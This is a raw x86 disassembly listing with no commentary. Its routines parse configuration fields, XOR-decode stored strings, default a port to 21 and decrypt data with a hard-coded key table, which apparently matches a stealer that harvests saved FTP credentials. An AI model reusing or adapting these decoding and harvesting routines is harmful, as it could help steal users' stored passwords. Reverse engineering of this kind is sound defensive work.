  404869:	e8 22 7a 00 00       	call   0x40c290
  40486e:	83 f8 ff             	cmp    $0xffffffff,%eax
  404871:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404875:	0f 84 e6 01 00 00    	je     0x404a61
  40487b:	68 26 06 00 00       	push   $0x626
  404880:	6a 08                	push   $0x8
  404882:	ff 35 a0 3e 42 00    	push   0x423ea0
  404888:	ff 15 94 e0 40 00    	call   *0x40e094
  40488e:	89 44 24 24          	mov    %eax,0x24(%esp)
  404892:	33 d2                	xor    %edx,%edx
  404894:	33 c0                	xor    %eax,%eax
  404896:	8a 88 4c e5 40 00    	mov    0x40e54c(%eax),%cl
  40489c:	88 4c 04 50          	mov    %cl,0x50(%esp,%eax,1)
  4048a0:	40                   	inc    %eax
  4048a1:	84 c9                	test   %cl,%cl
  4048a3:	75 f1                	jne    0x404896
  4048a5:	33 c0                	xor    %eax,%eax
  4048a7:	8a 88 44 e5 40 00    	mov    0x40e544(%eax),%cl
  4048ad:	88 4c 04 40          	mov    %cl,0x40(%esp,%eax,1)
  4048b1:	40                   	inc    %eax
  4048b2:	84 c9                	test   %cl,%cl
  4048b4:	75 f1                	jne    0x4048a7
  4048b6:	33 c0                	xor    %eax,%eax
  4048b8:	8a 88 3c e5 40 00    	mov    0x40e53c(%eax),%cl
  4048be:	88 4c 04 48          	mov    %cl,0x48(%esp,%eax,1)
  4048c2:	40                   	inc    %eax
  4048c3:	84 c9                	test   %cl,%cl
  4048c5:	75 f1                	jne    0x4048b8
  4048c7:	33 c0                	xor    %eax,%eax
  4048c9:	8a 88 30 e5 40 00    	mov    0x40e530(%eax),%cl
  4048cf:	88 4c 04 5c          	mov    %cl,0x5c(%esp,%eax,1)
  4048d3:	40                   	inc    %eax
  4048d4:	84 c9                	test   %cl,%cl
  4048d6:	75 f1                	jne    0x4048c9
  4048d8:	39 54 24 24          	cmp    %edx,0x24(%esp)
  4048dc:	0f 84 68 01 00 00    	je     0x404a4a
  4048e2:	39 54 24 1c          	cmp    %edx,0x1c(%esp)
  4048e6:	89 54 24 20          	mov    %edx,0x20(%esp)
  4048ea:	0f 86 5a 01 00 00    	jbe    0x404a4a
  4048f0:	8b 1d 2c e1 40 00    	mov    0x40e12c,%ebx
  4048f6:	8b 74 24 20          	mov    0x20(%esp),%esi
  4048fa:	8b 44 24 18          	mov    0x18(%esp),%eax
  4048fe:	c1 e6 02             	shl    $0x2,%esi
  404901:	03 c6                	add    %esi,%eax
  404903:	83 38 00             	cmpl   $0x0,(%eax)
  404906:	0f 84 2c 01 00 00    	je     0x404a38
  40490c:	8d 4c 24 50          	lea    0x50(%esp),%ecx
  404910:	51                   	push   %ecx
  404911:	ff 30                	push   (%eax)
  404913:	ff d3                	call   *%ebx
  404915:	89 44 24 14          	mov    %eax,0x14(%esp)
  404919:	8d 44 24 40          	lea    0x40(%esp),%eax
  40491d:	50                   	push   %eax
  40491e:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404922:	ff 34 06             	push   (%esi,%eax,1)
  404925:	ff d3                	call   *%ebx
  404927:	8b f8                	mov    %eax,%edi
  404929:	8d 44 24 48          	lea    0x48(%esp),%eax
  40492d:	50                   	push   %eax
  40492e:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404932:	ff 34 06             	push   (%esi,%eax,1)
  404935:	ff d3                	call   *%ebx
  404937:	89 44 24 10          	mov    %eax,0x10(%esp)
  40493b:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  40493f:	50                   	push   %eax
  404940:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404944:	ff 34 06             	push   (%esi,%eax,1)
  404947:	ff d3                	call   *%ebx
  404949:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  40494e:	8b f0                	mov    %eax,%esi
  404950:	0f 84 e2 00 00 00    	je     0x404a38
  404956:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  40495b:	0f 84 d7 00 00 00    	je     0x404a38
  404961:	85 f6                	test   %esi,%esi
  404963:	0f 84 cf 00 00 00    	je     0x404a38
  404969:	83 44 24 14 08       	addl   $0x8,0x14(%esp)
  40496e:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404972:	83 44 24 10 06       	addl   $0x6,0x10(%esp)
  404977:	83 c6 0a             	add    $0xa,%esi
  40497a:	e8 25 fe ff ff       	call   0x4047a4
  40497f:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404983:	e8 1c fe ff ff       	call   0x4047a4
  404988:	8b ce                	mov    %esi,%ecx
  40498a:	e8 15 fe ff ff       	call   0x4047a4
  40498f:	85 ff                	test   %edi,%edi
  404991:	74 20                	je     0x4049b3
  404993:	83 c7 06             	add    $0x6,%edi
  404996:	8b cf                	mov    %edi,%ecx
  404998:	e8 07 fe ff ff       	call   0x4047a4
  40499d:	8b c7                	mov    %edi,%eax
  40499f:	e8 61 77 00 00       	call   0x40c105
  4049a4:	8b f8                	mov    %eax,%edi
  4049a6:	83 ff 01             	cmp    $0x1,%edi
  4049a9:	72 08                	jb     0x4049b3
  4049ab:	81 ff ff ff 00 00    	cmp    $0xffff,%edi
  4049b1:	76 03                	jbe    0x4049b6
  4049b3:	6a 15                	push   $0x15
  4049b5:	5f                   	pop    %edi
  4049b6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4049ba:	80 38 00             	cmpb   $0x0,(%eax)
  4049bd:	74 79                	je     0x404a38
  4049bf:	8b 44 24 10          	mov    0x10(%esp),%eax
  4049c3:	80 38 00             	cmpb   $0x0,(%eax)
  4049c6:	74 70                	je     0x404a38
  4049c8:	8a 06                	mov    (%esi),%al
  4049ca:	84 c0                	test   %al,%al
  4049cc:	74 6a                	je     0x404a38
  4049ce:	3c 30                	cmp    $0x30,%al
  4049d0:	74 04                	je     0x4049d6
  4049d2:	3c 31                	cmp    $0x31,%al
  4049d4:	75 06                	jne    0x4049dc
  4049d6:	80 7e 01 00          	cmpb   $0x0,0x1(%esi)
  4049da:	74 5c                	je     0x404a38
  4049dc:	33 c0                	xor    %eax,%eax
  4049de:	38 06                	cmp    %al,(%esi)
  4049e0:	74 56                	je     0x404a38
  4049e2:	80 34 30 19          	xorb   $0x19,(%eax,%esi,1)
  4049e6:	40                   	inc    %eax
  4049e7:	80 3c 30 00          	cmpb   $0x0,(%eax,%esi,1)
  4049eb:	75 f5                	jne    0x4049e2
  4049ed:	85 c0                	test   %eax,%eax
  4049ef:	7e 47                	jle    0x404a38
  4049f1:	8d 44 24 68          	lea    0x68(%esp),%eax
  4049f5:	50                   	push   %eax
  4049f6:	ba 18 e9 40 00       	mov    $0x40e918,%edx
  4049fb:	e8 11 0b 00 00       	call   0x405511
  404a00:	59                   	pop    %ecx
  404a01:	57                   	push   %edi
  404a02:	ff 74 24 18          	push   0x18(%esp)
  404a06:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  404a0a:	56                   	push   %esi
  404a0b:	ff 74 24 1c          	push   0x1c(%esp)
  404a0f:	8d 44 24 78          	lea    0x78(%esp),%eax
  404a13:	50                   	push   %eax
  404a14:	ba 11 03 00 00       	mov    $0x311,%edx
  404a19:	e8 db 79 00 00       	call   0x40c3f9
  404a1e:	83 c4 14             	add    $0x14,%esp
  404a21:	85 c0                	test   %eax,%eax
  404a23:	7e 13                	jle    0x404a38
  404a25:	8b 75 10             	mov    0x10(%ebp),%esi
  404a28:	57                   	push   %edi
  404a29:	8b ce                	mov    %esi,%ecx
  404a2b:	e8 db 75 00 00       	call   0x40c00b
  404a30:	84 c0                	test   %al,%al
  404a32:	59                   	pop    %ecx
  404a33:	74 03                	je     0x404a38
  404a35:	ff 46 04             	incl   0x4(%esi)
  404a38:	ff 44 24 20          	incl   0x20(%esp)
  404a3c:	8b 44 24 20          	mov    0x20(%esp),%eax
  404a40:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  404a44:	0f 82 ac fe ff ff    	jb     0x4048f6
  404a4a:	ff 74 24 24          	push   0x24(%esp)
  404a4e:	e8 e7 73 00 00       	call   0x40be3a
  404a53:	8b 44 24 20          	mov    0x20(%esp),%eax
  404a57:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  404a5b:	59                   	pop    %ecx
  404a5c:	e8 f3 73 00 00       	call   0x40be54
  404a61:	33 f6                	xor    %esi,%esi
  404a63:	39 74 24 28          	cmp    %esi,0x28(%esp)
  404a67:	74 10                	je     0x404a79
  404a69:	68 00 80 00 00       	push   $0x8000
  404a6e:	56                   	push   %esi
  404a6f:	ff 74 24 30          	push   0x30(%esp)
  404a73:	ff 15 cc e0 40 00    	call   *0x40e0cc
  404a79:	39 74 24 30          	cmp    %esi,0x30(%esp)
  404a7d:	74 0a                	je     0x404a89
  404a7f:	ff 74 24 30          	push   0x30(%esp)
  404a83:	ff 15 c4 e0 40 00    	call   *0x40e0c4
  404a89:	5f                   	pop    %edi
  404a8a:	5e                   	pop    %esi
  404a8b:	b0 01                	mov    $0x1,%al
  404a8d:	5b                   	pop    %ebx
  404a8e:	8b e5                	mov    %ebp,%esp
  404a90:	5d                   	pop    %ebp
  404a91:	c3                   	ret
  404a92:	55                   	push   %ebp
  404a93:	8b ec                	mov    %esp,%ebp
  404a95:	81 ec 40 02 00 00    	sub    $0x240,%esp
  404a9b:	56                   	push   %esi
  404a9c:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404a9f:	57                   	push   %edi
  404aa0:	50                   	push   %eax
  404aa1:	ba 10 e5 40 00       	mov    $0x40e510,%edx
  404aa6:	e8 66 0a 00 00       	call   0x405511
  404aab:	59                   	pop    %ecx
  404aac:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404aaf:	6a 08                	push   $0x8
  404ab1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404ab4:	33 f6                	xor    %esi,%esi
  404ab6:	56                   	push   %esi
  404ab7:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404aba:	50                   	push   %eax
  404abb:	c7 45 e8 26 00 00 00 	movl   $0x26,-0x18(%ebp)
  404ac2:	c7 45 ec 1a 00 00 00 	movl   $0x1a,-0x14(%ebp)
  404ac9:	c7 45 f0 23 00 00 00 	movl   $0x23,-0x10(%ebp)
  404ad0:	e8 c8 73 00 00       	call   0x40be9d
  404ad5:	33 ff                	xor    %edi,%edi
  404ad7:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  404add:	50                   	push   %eax
  404ade:	56                   	push   %esi
  404adf:	56                   	push   %esi
  404ae0:	ff 74 bd e8          	push   -0x18(%ebp,%edi,4)
  404ae4:	56                   	push   %esi
  404ae5:	ff 15 14 e1 40 00    	call   *0x40e114
  404aeb:	85 c0                	test   %eax,%eax
  404aed:	75 23                	jne    0x404b12
  404aef:	56                   	push   %esi
  404af0:	56                   	push   %esi
  404af1:	56                   	push   %esi
  404af2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404af5:	50                   	push   %eax
  404af6:	68 cc 47 40 00       	push   $0x4047cc
  404afb:	6a 02                	push   $0x2
  404afd:	6a 01                	push   $0x1
  404aff:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404b02:	50                   	push   %eax
  404b03:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  404b09:	50                   	push   %eax
  404b0a:	e8 39 37 00 00       	call   0x408248
  404b0f:	83 c4 24             	add    $0x24,%esp
  404b12:	47                   	inc    %edi
  404b13:	83 ff 03             	cmp    $0x3,%edi
  404b16:	72 bf                	jb     0x404ad7
  404b18:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  404b1b:	76 0a                	jbe    0x404b27
  404b1d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  404b20:	e8 7b e8 ff ff       	call   0x4033a0
  404b25:	eb 09                	jmp    0x404b30
  404b27:	ff 75 f8             	push   -0x8(%ebp)
  404b2a:	e8 0b 73 00 00       	call   0x40be3a
  404b2f:	59                   	pop    %ecx
  404b30:	5f                   	pop    %edi
  404b31:	5e                   	pop    %esi
  404b32:	c9                   	leave
  404b33:	c3                   	ret
  404b34:	55                   	push   %ebp
  404b35:	8d 6c 24 88          	lea    -0x78(%esp),%ebp
  404b39:	81 ec ec 01 00 00    	sub    $0x1ec,%esp
  404b3f:	56                   	push   %esi
  404b40:	66 c7 45 84 22 e7    	movw   $0xe722,-0x7c(%ebp)
  404b46:	66 c7 45 86 2f f6    	movw   $0xf62f,-0x7a(%ebp)
  404b4c:	66 c7 45 88 7c b6    	movw   $0xb67c,-0x78(%ebp)
  404b52:	66 c7 45 8a 5a dd    	movw   $0xdd5a,-0x76(%ebp)
  404b58:	66 c7 45 8c db 0f    	movw   $0xfdb,-0x74(%ebp)
  404b5e:	66 c7 45 8e 4e b9    	movw   $0xb94e,-0x72(%ebp)
  404b64:	66 c7 45 90 96 51    	movw   $0x5196,-0x70(%ebp)
  404b6a:	66 c7 45 92 40 e0    	movw   $0xe040,-0x6e(%ebp)
  404b70:	66 c7 45 94 94 f6    	movw   $0xf694,-0x6c(%ebp)
  404b76:	66 c7 45 96 e2 ab    	movw   $0xabe2,-0x6a(%ebp)
  404b7c:	66 c7 45 98 bb 21    	movw   $0x21bb,-0x68(%ebp)
  404b82:	66 c7 45 9a 08 fc    	movw   $0xfc08,-0x66(%ebp)
  404b88:	66 c7 45 9c 8e e4    	movw   $0xe48e,-0x64(%ebp)
  404b8e:	66 c7 45 9e 6a b9    	movw   $0xb96a,-0x62(%ebp)
  404b94:	66 c7 45 a0 d7 55    	movw   $0x55d7,-0x60(%ebp)
  404b9a:	66 c7 45 a2 e5 a6    	movw   $0xa6e5,-0x5e(%ebp)
  404ba0:	66 c7 45 a4 a1 a4    	movw   $0xa4a1,-0x5c(%ebp)
  404ba6:	66 c7 45 a6 72 21    	movw   $0x2172,-0x5a(%ebp)
  404bac:	66 c7 45 a8 2d 82    	movw   $0x822d,-0x58(%ebp)
  404bb2:	66 c7 45 aa ec 29    	movw   $0x29ec,-0x56(%ebp)
  404bb8:	66 c7 45 ac e4 57    	movw   $0x57e4,-0x54(%ebp)
  404bbe:	66 c7 45 ae 58 14    	movw   $0x1458,-0x52(%ebp)
  404bc4:	66 c7 45 b0 d1 04    	movw   $0x4d1,-0x50(%ebp)
  404bca:	66 c7 45 b2 c1 9d    	movw   $0x9dc1,-0x4e(%ebp)
  404bd0:	66 c7 45 b4 20 70    	movw   $0x7020,-0x4c(%ebp)
  404bd6:	66 c7 45 b6 6a fc    	movw   $0xfc6a,-0x4a(%ebp)
  404bdc:	66 c7 45 b8 8f ed    	movw   $0xed8f,-0x48(%ebp)
  404be2:	66 c7 45 ba ba ef    	movw   $0xefba,-0x46(%ebp)
  404be8:	66 c7 45 bc 88 8e    	movw   $0x8e88,-0x44(%ebp)
  404bee:	66 c7 45 be 89 d6    	movw   $0xd689,-0x42(%ebp)
  404bf4:	66 c7 45 c0 8e d1    	movw   $0xd18e,-0x40(%ebp)
  404bfa:	66 c7 45 c2 40 87    	movw   $0x8740,-0x3e(%ebp)
  404c00:	66 c7 45 c4 de a6    	movw   $0xa6de,-0x3c(%ebp)
  404c06:	66 c7 45 c6 01 8e    	movw   $0x8e01,-0x3a(%ebp)
  404c0c:	66 c7 45 c8 c2 3a    	movw   $0x3ac2,-0x38(%ebp)
  404c12:	66 c7 45 ca 71 68    	movw   $0x6871,-0x36(%ebp)
  404c18:	66 c7 45 cc 11 ee    	movw   $0xee11,-0x34(%ebp)
  404c1e:	66 c7 45 ce 2a 8c    	movw   $0x8c2a,-0x32(%ebp)
  404c24:	66 c7 45 d0 c1 5f    	movw   $0x5fc1,-0x30(%ebp)
  404c2a:	66 c7 45 d2 7f 33    	movw   $0x337f,-0x2e(%ebp)
  404c30:	66 c7 45 d4 32 6d    	movw   $0x6d32,-0x2c(%ebp)
  404c36:	66 c7 45 d6 71 d4    	movw   $0xd471,-0x2a(%ebp)
  404c3c:	66 c7 45 d8 c9 7d    	movw   $0x7dc9,-0x28(%ebp)
  404c42:	66 c7 45 da d9 0c    	movw   $0xcd9,-0x26(%ebp)
  404c48:	66 c7 45 dc 71 50    	movw   $0x5071,-0x24(%ebp)
  404c4e:	66 c7 45 de 94 a0    	movw   $0xa094,-0x22(%ebp)
  404c54:	66 c7 45 e0 05 16    	movw   $0x1605,-0x20(%ebp)
  404c5a:	66 c7 45 e2 d7 6f    	movw   $0x6fd7,-0x1e(%ebp)
  404c60:	66 c7 45 e4 38 36    	movw   $0x3638,-0x1c(%ebp)
  404c66:	66 c7 45 e6 fd 4f    	movw   $0x4ffd,-0x1a(%ebp)
  404c6c:	66 c7 45 e8 b2 b3    	movw   $0xb3b2,-0x18(%ebp)
  404c72:	66 c7 45 ea 17 97    	movw   $0x9717,-0x16(%ebp)
  404c78:	66 c7 45 ec ca be    	movw   $0xbeca,-0x14(%ebp)
  404c7e:	66 c7 45 ee 1c 72    	movw   $0x721c,-0x12(%ebp)
  404c84:	66 c7 45 f0 3f 62    	movw   $0x623f,-0x10(%ebp)
  404c8a:	66 c7 45 f2 8f 06    	movw   $0x68f,-0xe(%ebp)
  404c90:	66 c7 45 f4 8f 69    	movw   $0x698f,-0xc(%ebp)
  404c96:	66 c7 45 f6 ff 7f    	movw   $0x7fff,-0xa(%ebp)
  404c9c:	66 c7 45 f8 9c e2    	movw   $0xe29c,-0x8(%ebp)
  404ca2:	66 c7 45 fa e8 27    	movw   $0x27e8,-0x6(%ebp)
  404ca8:	66 c7 45 fc 89 71    	movw   $0x7189,-0x4(%ebp)
  404cae:	66 c7 45 fe 39 49    	movw   $0x4939,-0x2(%ebp)
  404cb4:	66 c7 45 00 4e db    	movw   $0xdb4e,0x0(%ebp)
  404cba:	66 c7 45 02 fd c3    	movw   $0xc3fd,0x2(%ebp)
  404cc0:	66 c7 45 04 8b 8f    	movw   $0x8f8b,0x4(%ebp)
  404cc6:	66 c7 45 06 ee f4    	movw   $0xf4ee,0x6(%ebp)
  404ccc:	66 c7 45 08 95 93    	movw   $0x9395,0x8(%ebp)
  404cd2:	66 c7 45 0a 1a 6b    	movw   $0x6b1a,0xa(%ebp)
  404cd8:	66 c7 45 0c b1 d1    	movw   $0xd1b1,0xc(%ebp)
  404cde:	66 c7 45 0e 6a 0f    	movw   $0xf6a,0xe(%ebp)
  404ce4:	66 c7 45 10 8b 4d    	movw   $0x4d8b,0x10(%ebp)
  404cea:	66 c7 45 12 96 a6    	movw   $0xa696,0x12(%ebp)
  404cf0:	66 c7 45 14 9d a7    	movw   $0xa79d,0x14(%ebp)
  404cf6:	66 c7 45 16 9e bb    	movw   $0xbb9e,0x16(%ebp)
  404cfc:	66 c7 45 18 df 00    	movw   $0xdf,0x18(%ebp)
  404d02:	66 c7 45 1a 3c 09    	movw   $0x93c,0x1a(%ebp)
  404d08:	66 c7 45 1c 6f 85    	movw   $0x856f,0x1c(%ebp)
  404d0e:	66 c7 45 1e 1c b5    	movw   $0xb51c,0x1e(%ebp)
  404d14:	66 c7 45 20 c5 f1    	movw   $0xf1c5,0x20(%ebp)
  404d1a:	66 c7 45 22 3d e8    	movw   $0xe83d,0x22(%ebp)
  404d20:	8b cf                	mov    %edi,%ecx
  404d22:	66 c7 45 24 3a 39    	movw   $0x393a,0x24(%ebp)
  404d28:	66 c7 45 26 d1 03    	movw   $0x3d1,0x26(%ebp)
  404d2e:	66 c7 45 28 d8 68    	movw   $0x68d8,0x28(%ebp)
  404d34:	66 c7 45 2a 59 96    	movw   $0x9659,0x2a(%ebp)
  404d3a:	66 c7 45 2c 91 f7    	movw   $0xf791,0x2c(%ebp)
  404d40:	66 c7 45 2e c2 b2    	movw   $0xb2c2,0x2e(%ebp)
  404d46:	66 c7 45 30 34 02    	movw   $0x234,0x30(%ebp)
  404d4c:	66 c7 45 32 5c 9b    	movw   $0x9b5c,0x32(%ebp)
  404d52:	66 c7 45 34 bf b1    	movw   $0xb1bf,0x34(%ebp)
  404d58:	66 c7 45 36 eb 72    	movw   $0x72eb,0x36(%ebp)
  404d5e:	66 c7 45 38 ba da    	movw   $0xdaba,0x38(%ebp)
  404d64:	66 c7 45 3a c5 f1    	movw   $0xf1c5,0x3a(%ebp)
  404d6a:	66 c7 45 3c 01 da    	movw   $0xda01,0x3c(%ebp)
  404d70:	66 c7 45 3e 47 f0    	movw   $0xf047,0x3e(%ebp)
  404d76:	66 c7 45 40 d8 3d    	movw   $0x3dd8,0x40(%ebp)
  404d7c:	66 c7 45 42 ab 72    	movw   $0x72ab,0x42(%ebp)
  404d82:	66 c7 45 44 4c 78    	movw   $0x784c,0x44(%ebp)
  404d88:	66 c7 45 46 77 00    	movw   $0x77,0x46(%ebp)
  404d8e:	66 c7 45 48 5f b0    	movw   $0xb05f,0x48(%ebp)
  404d94:	66 c7 45 4a 45 a2    	movw   $0xa245,0x4a(%ebp)
  404d9a:	66 c7 45 4c 94 17    	movw   $0x1794,0x4c(%ebp)
  404da0:	66 c7 45 4e d9 16    	movw   $0x16d9,0x4e(%ebp)
  404da6:	66 c7 45 50 c6 c6    	movw   $0xc6c6,0x50(%ebp)
  404dac:	66 c7 45 52 a2 ff    	movw   $0xffa2,0x52(%ebp)
  404db2:	66 c7 45 54 99 f0    	movw   $0xf099,0x54(%ebp)
  404db8:	66 c7 45 56 88 3d    	movw   $0x3d88,0x56(%ebp)
  404dbe:	66 c7 45 58 24 a6    	movw   $0xa624,0x58(%ebp)
  404dc4:	66 c7 45 5a 3d de    	movw   $0xde3d,0x5a(%ebp)
  404dca:	66 c7 45 5c 5b d3    	movw   $0xd35b,0x5c(%ebp)
  404dd0:	66 c7 45 5e b3 82    	movw   $0x82b3,0x5e(%ebp)
  404dd6:	66 c7 45 60 9c 7e    	movw   $0x7e9c,0x60(%ebp)
  404ddc:	66 c7 45 62 06 f4    	movw   $0xf406,0x62(%ebp)
  404de2:	66 c7 45 64 08 16    	movw   $0x1608,0x64(%ebp)
  404de8:	66 c7 45 66 aa 07    	movw   $0x7aa,0x66(%ebp)
  404dee:	66 c7 45 68 7e f9    	movw   $0xf97e,0x68(%ebp)
  404df4:	66 c7 45 6a 3a 37    	movw   $0x373a,0x6a(%ebp)
  404dfa:	66 c7 45 6c 41 c4    	movw   $0xc441,0x6c(%ebp)
  404e00:	66 c7 45 6e b0 15    	movw   $0x15b0,0x6e(%ebp)
  404e06:	66 c7 45 70 99 b6    	movw   $0xb699,0x70(%ebp)
  404e0c:	66 c7 45 72 1c f8    	movw   $0xf81c,0x72(%ebp)
  404e12:	66 c7 45 74 8f e3    	movw   $0xe38f,0x74(%ebp)
  404e18:	66 c7 45 76 97 cb    	movw   $0xcb97,0x76(%ebp)
  404e1e:	e8 41 75 00 00       	call   0x40c364
  404e23:	99                   	cltd
  404e24:	83 e2 03             	and    $0x3,%edx
  404e27:	03 c2                	add    %edx,%eax
  404e29:	8b f0                	mov    %eax,%esi
  404e2b:	c1 fe 02             	sar    $0x2,%esi
  404e2e:	83 fe 7b             	cmp    $0x7b,%esi
  404e31:	73 40                	jae    0x404e73
  404e33:	8d 8d 8c fe ff ff    	lea    -0x174(%ebp),%ecx
  404e39:	8b c7                	mov    %edi,%eax
  404e3b:	e8 f3 73 00 00       	call   0x40c233
  404e40:	84 c0                	test   %al,%al
  404e42:	74 2f                	je     0x404e73
  404e44:	33 c0                	xor    %eax,%eax
  404e46:	85 f6                	test   %esi,%esi
  404e48:	7e 20                	jle    0x404e6a
  404e4a:	33 d2                	xor    %edx,%edx
  404e4c:	8d 8c 45 8d fe ff ff 	lea    -0x173(%ebp,%eax,2),%ecx
  404e53:	8a 71 ff             	mov    -0x1(%ecx),%dh
  404e56:	8a 11                	mov    (%ecx),%dl
  404e58:	66 33 54 45 84       	xor    -0x7c(%ebp,%eax,2),%dx
  404e5d:	66 c1 c2 08          	rol    $0x8,%dx
  404e61:	66 89 14 47          	mov    %dx,(%edi,%eax,2)
  404e65:	40                   	inc    %eax
  404e66:	3b c6                	cmp    %esi,%eax
  404e68:	7c e0                	jl     0x404e4a
  404e6a:	66 83 24 77 00       	andw   $0x0,(%edi,%esi,2)
  404e6f:	8b c6                	mov    %esi,%eax
  404e71:	eb 02                	jmp    0x404e75
  404e73:	33 c0                	xor    %eax,%eax
  404e75:	5e                   	pop    %esi
  404e76:	83 c5 78             	add    $0x78,%ebp
  404e79:	c9                   	leave
  404e7a:	c3                   	ret
  404e7b:	55                   	push   %ebp
  404e7c:	8b ec                	mov    %esp,%ebp
  404e7e:	83 e4 f8             	and    $0xfffffff8,%esp
  404e81:	83 ec 10             	sub    $0x10,%esp
  404e84:	8d 44 24 04          	lea    0x4(%esp),%eax
  404e88:	50                   	push   %eax
  404e89:	ba d0 e6 40 00       	mov    $0x40e6d0,%edx
  404e8e:	e8 7e 06 00 00       	call   0x405511
  404e93:	59                   	pop    %ecx
  404e94:	8d 44 24 04          	lea    0x4(%esp),%eax
  404e98:	89 04 24             	mov    %eax,(%esp)
  404e9b:	33 c0                	xor    %eax,%eax
  404e9d:	50                   	push   %eax
  404e9e:	50                   	push   %eax
  404e9f:	50                   	push   %eax
  404ea0:	ff 75 0c             	push   0xc(%ebp)
  404ea3:	8d 44 24 10          	lea    0x10(%esp),%eax
  404ea7:	68 c0 4e 40 00       	push   $0x404ec0
  404eac:	6a 05                	push   $0x5
  404eae:	6a 01                	push   $0x1
  404eb0:	50                   	push   %eax
  404eb1:	ff 75 08             	push   0x8(%ebp)
  404eb4:	e8 8f 33 00 00       	call   0x408248
  404eb9:	83 c4 24             	add    $0x24,%esp
  404ebc:	8b e5                	mov    %ebp,%esp
  404ebe:	5d                   	pop    %ebp
  404ebf:	c3                   	ret
  404ec0:	55                   	push   %ebp
  404ec1:	8b ec                	mov    %esp,%ebp
  404ec3:	81 ec 98 02 00 00    	sub    $0x298,%esp
  404ec9:	56                   	push   %esi
  404eca:	ff 75 08             	push   0x8(%ebp)
  404ecd:	8b 75 0c             	mov    0xc(%ebp),%esi
  404ed0:	8d 8d 68 fd ff ff    	lea    -0x298(%ebp),%ecx
  404ed6:	8d 46 2c             	lea    0x2c(%esi),%eax
  404ed9:	51                   	push   %ecx
  404eda:	e8 3d 33 00 00       	call   0x40821c
